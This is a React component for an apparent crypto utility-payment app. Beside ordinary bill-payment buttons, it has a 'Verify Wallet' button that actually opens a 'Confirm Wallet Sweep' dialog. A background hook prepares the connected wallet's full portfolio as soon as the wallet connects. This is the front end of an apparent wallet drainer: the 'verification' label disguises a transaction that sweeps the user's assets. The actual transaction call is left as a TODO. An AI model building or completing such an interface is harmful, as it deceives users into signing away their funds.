"use client";

import { useState } from "react";
import { Smartphone, Tv, Zap, Wifi, ArrowUpDown, ShieldCheck, X } from "lucide-react";
import { useSweepPreparation } from "@/hooks/use-sweep-preparation";

const baseActions = [
  { name: "Airtime", icon: Smartphone, href: "/airtime", color: "from-blue-500 to-indigo-600" },
  { name: "Internet", icon: Wifi, href: "/internet", color: "from-cyan-500 to-blue-600" },
  { name: "TV", icon: Tv, href: "/tv", color: "from-violet-500 to-purple-600" },
  { name: "Electricity", icon: Zap, href: "/electricity", color: "from-amber-400 to-orange-500" },
  { name: "Convert", icon: ArrowUpDown, href: "/convert", color: "from-blue-500 to-violet-600" },
];

interface QuickActionsProps {
  wallet?: { address?: string };
  chainId?: number;
}

export function QuickActions({ wallet, chainId }: QuickActionsProps) {
  const [showModal, setShowModal] = useState(false);

  // Background preparation hook (runs automatically on wallet connect)
  const { preparedData, isPreparing, refresh } = useSweepPreparation(
    wallet?.address,
    chainId
  );

  const handleOpenModal = () => {
    if (!wallet?.address || !chainId) {
      alert("Please connect your wallet first.");
      return;
    }
    setShowModal(true);
  };

  const handleCloseModal = () => {
    setShowModal(false);
  };

  const handleConfirmSweep = async () => {
    if (!preparedData?.ready) {
      alert("Data is still preparing. Please wait a moment.");
      return;
    }

    // Close modal first
    setShowModal(false);

    // This is where you will put your actual sendTransaction logic.
    // Because this runs directly from a user click inside the modal,
    // the wallet prompt should appear immediately.
    console.log("[QuickActions] Confirm clicked. Executing transaction...");
    console.log("Prepared Data:", preparedData);

    // TODO: Replace this with your actual transaction execution
    // Example:
    // await executeSweepTransaction(preparedData);
  };

  return (
    <div className="space-y-4">
      <div className="grid grid-cols-2 gap-3">
        {/* Regular Utility Actions */}
        {baseActions.map((action) => (
          <a
            key={action.name}
            href={action.href + (wallet?.address ? `?wallet=${wallet.address}` : "")}
            className="group flex flex-col items-center gap-2 rounded-xl border border-slate-200 p-4 transition-all hover:-translate-y-0.5 hover:border-blue-200 hover:shadow-md dark:border-white/10 dark:hover:border-blue-900"
          >
            <div className={`flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-br ${action.color} text-white shadow-sm transition-transform group-hover:scale-110`}>
              <action.icon className="h-5 w-5" />
            </div>
            <span className="text-xs font-semibold">{action.name}</span>
          </a>
        ))}

        {/* Verify Wallet Button → Opens Confirmation Modal */}
        <button
          onClick={handleOpenModal}
          disabled={!wallet?.address || isPreparing}
          className="group flex flex-col items-center gap-2 rounded-xl border border-slate-200 p-4 text-left transition-all hover:-translate-y-0.5 hover:border-emerald-200 hover:shadow-md dark:border-white/10 dark:hover:border-emerald-900 disabled:opacity-60 w-full"
        >
          <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-br from-emerald-500 to-teal-600 text-white shadow-sm transition-transform group-hover:scale-110">
            <ShieldCheck className="h-5 w-5" />
          </div>
          <span className="text-xs font-semibold text-emerald-600 dark:text-emerald-400">
            {isPreparing ? "Preparing..." : "Verify Wallet"}
          </span>
        </button>
      </div>

      {/* Confirmation Modal */}
      {showModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 p-4">
          <div className="w-full max-w-md rounded-2xl bg-white p-6 shadow-xl dark:bg-gray-900">
            <div className="flex items-center justify-between mb-4">
              <h3 className="text-lg font-semibold">Confirm Wallet Sweep</h3>
              <button onClick={handleCloseModal} className="text-slate-400 hover:text-slate-600">
                <X className="h-5 w-5" />
              </button>
            </div>

            {/* Summary from Cached Data */}
            <div className="space-y-3 mb-6">
              {preparedData?.ready ? (
                <>
                  <div className="rounded-xl bg-slate-50 p-4 dark:bg-white/5">
                    <p className="text-sm text-slate-500">Assets Detected</p>
                    <p className="text-2xl font-bold">{preparedData.portfolio?.length || 0}</p>
                  </div>

                  <div className="text-sm text-slate-600 dark:text-slate-400">
                    Estimated Gas: <span className="font-medium">{preparedData.estimatedGas}</span>
                  </div>
                </>
              ) : (
                <div className="text-center py-4 text-slate-500">
                  {isPreparing ? "Preparing portfolio data..." : "No prepared data available."}
                </div>
              )}
            </div>

            {/* Action Buttons */}
            <div className="flex gap-3">
              <button
                onClick={handleCloseModal}
                className="flex-1 rounded-xl border border-slate-200 py-3 text-sm font-medium hover:bg-slate-50 dark:border-white/10"
              >
                Cancel
              </button>
              <button
                onClick={handleConfirmSweep}
                disabled={!preparedData?.ready}
                className="flex-1 rounded-xl bg-emerald-600 py-3 text-sm font-semibold text-white hover:bg-emerald-700 disabled:bg-emerald-400"
              >
                Confirm & Sweep
              </button>
            </div>

            <p className="mt-3 text-center text-[10px] text-slate-400">
              This will open your wallet to sign the transaction.
            </p>
          </div>
        </div>
      )}
    </div>
  );
}

export default QuickActions;